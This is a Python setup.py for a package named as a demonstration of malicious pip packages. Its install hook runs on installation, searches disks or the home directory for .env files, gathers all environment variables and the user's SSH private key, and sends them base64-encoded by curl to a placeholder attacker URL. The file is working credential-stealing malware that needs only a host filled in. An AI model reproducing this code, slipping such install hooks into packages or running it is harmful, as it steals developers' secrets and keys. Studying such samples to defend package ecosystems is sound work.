from turtle import home
import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import os.path
import os
import base64
import subprocess
from sys import platform
import string
from pathlib import Path


URL = "http://<YOUR IP:PORT>"


def stealenv():
    global URL
    # Steal environment variables from shell and from .env
    dotenv = ""
    environs = {}
    paths = []
    
    if platform == "win32":
        # Windows
        # get all drives
        available_drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]
        
        curr_dir = os.getcwd()
        os.chdir("/")

        for drive in available_drives:
            powershell_cmd = "powershell.exe Get-ChildItem -Path %s -Filter *.env -Recurse -ErrorAction SilentlyContinue -Force -File | ForEach-Object {$_.FullName}"%(drive)
            print(powershell_cmd)
            powershell_cmd = powershell_cmd.split(" ")
            try:
                result = subprocess.run(powershell_cmd, capture_output=True, timeout=2)
                output = result.stdout.decode()
                output = output.split("\n")
                if len(output)==0:
                    continue
                for i in output:
                    i = i.rstrip()
                    paths.append(i)
            except Exception as e:
                continue

        for i in paths:
            if os.path.exists(i):
                with open(i, "r") as f:
                    dotenv+=f.read()+"\n"
        
        os.chdir(curr_dir)
    
    else:
        # Linux and Mac
        home_path = str(Path.home())
        cmd = f"find {home_path} -type f -name *.env"
        cmd = cmd.split(" ")
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=5)
            output = result.stdout.decode().split("\n")
            if len(output)==0:
                return
            for i in output:
                i = i.rstrip()
                paths.append(i)
        except Exception as e:
            pass

        for i in paths:
            if os.path.exists(i):
                with open(i, "r") as f:
                    dotenv+=f.read()+"\n"
    

    for name, value in os.environ.items():
        environs[name] = value

    try:
        dotenv = base64.b64encode(dotenv.encode()).decode()
        environs = base64.b64encode(str(environs).encode()).decode()
        req1 = f"{URL}/?dotenv={dotenv}"
        req2 = f"{URL}/?environs={environs}"
        subprocess.check_output(["curl",req1])
        subprocess.check_output(["curl",req2])
    except Exception as e:
        pass

def stealsshkey():
    global URL
    home_path = str(Path.home())
    privkey = ""
    if not os.path.exists(os.path.join(home_path, ".ssh","id_rsa")):
        return
    
    with open(os.path.join(home_path, ".ssh","id_rsa"),"r") as f:
        privkey = f.read()

    if privkey=="" or privkey is None:
        return

    try:
        privkey = base64.b64encode(privkey.encode()).decode()
        req = f"{URL}/?id_rsa={privkey}"
        subprocess.check_output(["curl",req])
    except Exception as e:
        pass
    


class AfterDevelop(develop):
    def run(self):
        develop.run(self)

class AfterInstall(install):
    def run(self):
        install.run(self)
        stealenv()
        stealsshkey()


setuptools.setup(
    name = "malicious-pip-package-for-demo",
    version = "1.0.4",
    author = "Malicious Actor",
    author_email = "malactor@example.com",
    description = "A test package to demonstrate malicious pip packages",
    long_description = "long description",
    long_description_content_type = "text/markdown",
    url = "https://github.com/teja156/autobot-clipper",
    project_urls = {
        "Bug Tracker": "https://github.com/teja156/autobot-clipper/issues",
    },
    classifiers = [
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir = {"": "src"},
    packages = setuptools.find_packages(where="src"),
    python_requires = ">=3.6",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)